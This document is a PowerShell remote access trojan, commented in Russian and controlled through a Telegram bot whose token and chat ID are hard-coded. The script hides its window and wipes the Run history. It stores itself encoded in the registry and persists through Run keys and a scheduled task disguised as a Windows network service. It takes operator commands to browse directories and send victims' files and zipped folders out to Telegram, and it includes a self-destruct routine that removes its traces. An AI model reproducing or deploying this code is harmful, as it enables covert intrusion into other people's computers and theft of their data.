# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # Альтернативный метод с формой
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # Резервный метод отправки файла
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # Резервный метод архивации через COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# Уникальное место для сохранения - реестр как хранилище скрипта
function Install-RAT {
    # Очистка истории RUN при установке
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue
    
    # Сохраняем скрипт в реестре (уникальный метод)
    $regStoragePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
    if (!(Test-Path $regStoragePath)) { 
        New-Item -Path $regStoragePath -Force | Out-Null 
    }
    
    $scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
    $encodedContent = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($scriptContent))
    
    # Разбиваем на части из-за ограничения длины значений в реестре
    $chunkSize = 8000
    for ($i = 0; $i -lt $encodedContent.Length; $i += $chunkSize) {
        $chunk = $encodedContent.Substring($i, [Math]::Min($chunkSize, $encodedContent.Length - $i))
        Set-ItemProperty -Path $regStoragePath -Name "Hidden$i" -Value $chunk -Force -ErrorAction SilentlyContinue
    }
    
    # Создаем загрузчик из реестра
    $loaderPath = "$env:APPDATA\Microsoft\Network\wlanext.exe"
    $loaderContent = @"
`$parts = @(); `$i = 0; while (`$true) { `$part = (Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced' -Name "Hidden`$i" -ErrorAction SilentlyContinue)."Hidden`$i"; if (`$part) { `$parts += `$part; `$i++ } else { break } }; `$script = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((`$parts -join ''))); Invoke-Expression `$script
"@
    
    $loaderContent | Out-File -FilePath $loaderPath -Encoding UTF8 -Force
    
    # Устанавливаем в автозагрузку через несколько методов для надежности
    $regPaths = @(
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
    )
    
    foreach $regPath in $regPaths {
        if (!(Test-Path $regPath)) { 
            New-Item -Path $regPath -Force | Out-Null 
        }
        Set-ItemProperty -Path $regPath -Name "WindowsNetwork" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loaderPath`"" -Force -ErrorAction SilentlyContinue
    }
    
    # Дополнительный метод через планировщик задач
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loaderPath`""
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
    Register-ScheduledTask -TaskName "WindowsNetworkService" -Action $taskAction -Trigger $taskTrigger -Description "Windows Network Service" -Force -ErrorAction SilentlyContinue | Out-Null
    
    return $true
}

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""

# Установка RAT
$installationResult = Install-RAT
if ($installationResult) {
    Send-Telegram "RAT успешно установлен на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/selfdestruct - самоуничтожение"
} else {
    Send-Telegram "Ошибка установки RAT"
}

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/selfdestruct - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size - $($item.LastWriteTime.ToString('dd.MM.yyyy HH:mm'))"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/selfdestruct$" {
                            $success = $true
                            $report = "Отчет самоуничтожения:`n"
                            
                            # 1. Очистка истории RUN
                            try {
                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
                                $report += "✓ История RUN очищена`n"
                            } catch {
                                $report += "✗ Ошибка очистки истории RUN`n"
                                $success = $false
                            }
                            
                            # 2. Удаление из автозагрузки
                            $regPaths = @(
                                "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
                                "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
                            )
                            
                            foreach $regPath in $regPaths {
                                try {
                                    Remove-ItemProperty -Path $regPath -Name "WindowsNetwork" -Force -ErrorAction SilentlyContinue
                                } catch { }
                            }
                            $report += "✓ Автозагрузка удалена`n"
                            
                            # 3. Удаление планировщика задач
                            try {
                                Unregister-ScheduledTask -TaskName "WindowsNetworkService" -Confirm:$false -ErrorAction SilentlyContinue
                                $report += "✓ Планировщик задач очищен`n"
                            } catch {
                                $report += "✗ Ошибка удаления из планировщика`n"
                                $success = $false
                            }
                            
                            # 4. Удаление загрузчика
                            $loaderPath = "$env:APPDATA\Microsoft\Network\wlanext.exe"
                            try {
                                if (Test-Path $loaderPath) { 
                                    Remove-Item $loaderPath -Force -ErrorAction Stop
                                    $report += "✓ Загрузчик удален`n"
                                }
                            } catch {
                                $report += "✗ Ошибка удаления загрузчика`n"
                                $success = $false
                            }
                            
                            # 5. Очистка реестра от частей скрипта
                            $regStoragePath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
                            try {
                                $i = 0
                                while ($true) {
                                    $propName = "Hidden$i"
                                    $prop = Get-ItemProperty -Path $regStoragePath -Name $propName -ErrorAction SilentlyContinue
                                    if ($prop) {
                                        Remove-ItemProperty -Path $regStoragePath -Name $propName -Force -ErrorAction SilentlyContinue
                                        $i++
                                    } else {
                                        break
                                    }
                                }
                                $report += "✓ Данные из реестра удалены`n"
                            } catch {
                                $report += "✗ Ошибка очистки реестра`n"
                                $success = $false
                            }
                            
                            # 6. Удаление текущего файла скрипта через отдельный процесс
                            try {
                                $currentScript = $MyInvocation.MyCommand.Path
                                if (Test-Path $currentScript) {
                                    $cmd = "cmd /c ping 127.0.0.1 -n 3 > nul & del /f /q `"$currentScript`""
                                    Start-Process -WindowStyle Hidden -FilePath "cmd.exe" -ArgumentList "/c", $cmd
                                    $report += "✓ Файл скрипта помечен на удаление`n"
                                }
                            } catch {
                                $report += "✗ Ошибка удаления файла скрипта`n"
                                $success = $false
                            }
                            
                            if ($success) {
                                $report += "`n✅ Самоуничтожение завершено УСПЕШНО. Все следы удалены."
                            } else {
                                $report += "`n⚠️ Самоуничтожение завершено с ОШИБКАМИ. Некоторые следы могли остаться."
                            }
                            
                            Send-Telegram $report
                            exit
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
